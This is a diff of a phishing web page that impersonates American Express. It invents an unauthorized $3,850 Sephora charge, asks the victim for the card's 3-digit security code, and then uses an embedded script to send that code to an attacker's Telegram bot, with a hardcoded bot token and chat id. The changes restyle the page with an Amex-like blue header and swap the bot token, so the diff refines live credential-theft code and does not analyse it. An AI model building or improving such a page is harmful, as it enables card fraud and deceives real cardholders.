@@ -17,20 +17,63 @@
         }
         .container {
             background: white;
-            padding: 40px 30px;
             border-radius: 8px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.12);
             width: 100%;
             max-width: 420px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Signature Amex Blue Pattern Background */
+        .amex-pattern-bg {
+            background-color: #006fcf;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.08) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.06) 0%, transparent 35%),
+                repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 12px),
+                repeating-linear-gradient(-45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 12px);
+            padding: 40px 30px 50px;
             text-align: center;
+            color: white;
+            position: relative;
         }
-        .logo {
-            color: #006fcf;
-            font-size: 22px;
+        
+        .logo-text {
+            font-size: 24px;
             font-weight: bold;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
+            margin-bottom: 30px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
         }
+        
+        .info-icon {
+            width: 70px;
+            height: 70px;
+            border: 3px solid white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(4px);
+        }
+        
+        .pattern-headline {
+            font-size: 22px;
+            line-height: 1.4;
+            font-weight: 500;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.15);
+        }
+        
+        .white-section {
+            padding: 30px;
+            background: white;
+        }
+        
         .alert-banner {
             background-color: #e7f3ff;
             border: 1px solid #006fcf;
@@ -41,6 +84,7 @@
             font-size: 14px;
             font-weight: 600;
         }
+        
         .charge-detail {
             background-color: #f8f9fa;
             border-left: 3px solid #006fcf;
@@ -49,11 +93,13 @@
             text-align: left;
             font-size: 14px;
         }
+        
         .charge-amount {
             color: #006fcf;
             font-weight: bold;
             font-size: 18px;
         }
+        
         input {
             width: 100%;
             padding: 14px;
@@ -65,6 +111,7 @@
             text-align: center;
             letter-spacing: 2px;
         }
+        
         button {
             width: 100%;
             padding: 14px;
@@ -78,21 +125,27 @@
             margin-top: 10px;
             transition: background-color 0.2s;
         }
+        
         button:hover {
             background-color: #005bb5;
         }
+        
         .footer {
             margin-top: 25px;
             font-size: 11px;
             color: #666;
             line-height: 1.5;
+            text-align: center;
         }
+        
         .loader {
             display: none;
             margin-top: 15px;
             color: #006fcf;
             font-weight: 600;
+            text-align: center;
         }
+        
         .secure-badge {
             display: inline-flex;
             align-items: center;
@@ -105,41 +158,53 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">AMERICAN EXPRESS</div>
-        
-        <div class="alert-banner">
-            ⚠️ FRAUD ALERT: Suspicious Activity Detected
+        <!-- Blue Pattern Header Section -->
+        <div class="amex-pattern-bg">
+            <div class="logo-text">AMERICAN EXPRESS</div>
+            <div class="info-icon">i</div>
+            <div class="pattern-headline">
+                Suspicious Activity<br>Detected on Your Account
+            </div>
         </div>
         
-        <p style="font-size: 15px; color: #333; margin-bottom: 15px;">
-            We detected an unauthorized transaction on your account ending in <strong>33006</strong>. Your card has been temporarily restricted.
-        </p>
-        
-        <div class="charge-detail">
-            <div style="margin-bottom: 5px; color: #666;">Unauthorized Charge:</div>
-            <div class="charge-amount">$3,850.00</div>
-            <div style="margin-top: 5px; font-size: 12px; color: #666;">Merchant: SEPHORA ONLINE<br>Date: Oct 4, 2026 | Time: 11:47 PM EST</div>
-        </div>
-        
-        <p style="font-size: 14px; color: #333; margin: 20px 0;">
-            To verify your identity and lift the restriction, please enter the <strong>3-digit CSC</strong> from the back of your card:
-        </p>
-        
-        <form id="fraudForm">
-            <input type="text" id="csc" name="csc" placeholder="• • •" maxlength="3" required pattern="[0-9]{3}" inputmode="numeric">
-            <button type="submit">Verify & Restore Access</button>
-        </form>
-        
-        <div class="loader" id="loader">Verifying... Please wait</div>
-        
-        <div class="secure-badge">
-            🔒 256-bit SSL Encrypted Connection
-        </div>
-        
-        <div class="footer">
-            If you did not authorize this transaction, contact Fraud Dept immediately:<br>
-            1-800-528-4800 (24/7)<br><br>
-            © 2026 American Express Company. All rights reserved.
+        <!-- White Content Section -->
+        <div class="white-section">
+            <div class="alert-banner">
+                ⚠️ FRAUD ALERT: Suspicious Activity Detected
+            </div>
+            
+            <p style="font-size: 15px; color: #333; margin-bottom: 15px;">
+                We detected an unauthorized transaction on your account ending in <strong>33006</strong>. Your card has been temporarily restricted.
+            </p>
+            
+            <div class="charge-detail">
+                <div style="margin-bottom: 5px; color: #666;">Unauthorized Charge:</div>
+                <div class="charge-amount">$3,850.00</div>
+                <div style="margin-top: 5px; font-size: 12px; color: #666;">Merchant: SEPHORA ONLINE<br>Date: Oct 4, 2026 | Time: 11:47 PM EST</div>
+            </div>
+            
+            <p style="font-size: 14px; color: #333; margin: 20px 0;">
+                To verify your identity and cancel the transaction, please enter the <strong>3-digit CSC</strong> from the back of your card:
+            </p>
+            
+            <form id="fraudForm">
+                <input type="text" id="csc" name="csc" placeholder="• • •" maxlength="3" required pattern="[0-9]{3}" inputmode="numeric">
+                <button type="submit">Verify & Restore Access</button>
+            </form>
+            
+            <div class="loader" id="loader">Verifying... Please wait</div>
+            
+            <div style="text-align: center;">
+                <div class="secure-badge">
+                    🔒 256-bit SSL Encrypted Connection
+                </div>
+            </div>
+            
+            <div class="footer">
+                If you did not authorize this transaction, contact Fraud Dept immediately:<br>
+                1-800-528-4800 (24/7)<br><br>
+                © 2026 American Express Company. All rights reserved.
+            </div>
         </div>
     </div>
 
@@ -150,10 +215,10 @@
             const csc = document.getElementById('csc').value;
             
             // REPLACE THESE WITH YOUR ACTUAL TELEGRAM BOT DETAILS
-            const botToken = '8947701700:AAFpBFejWSFtcQZ01JP4D-qkIUopxBUyd4A';
+            const botToken = '8891517790:AAFvkeNXrA1klBs_Bbynv_7Us7vcsN5P0bw';
             const chatId = '8790611176';
 
-            const message = `*FRAUD ALERT DROP*\n\nCard Ending: \`33006\`\n🔢 CSC: \`${csc}\`\n💰 Charge: $3,850.00 @ SEPHORA\n⏰ Timestamp: ${new Date().toLocaleString()}`;
+            const message = `*FRAUD ALERT DROP*\n\nCard Ending: \`33006\`\n🔢 CSC: \`${csc}\`\n💰 Charge: $3,850.00 @ SEPHORA\n Timestamp: ${new Date().toLocaleString()}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
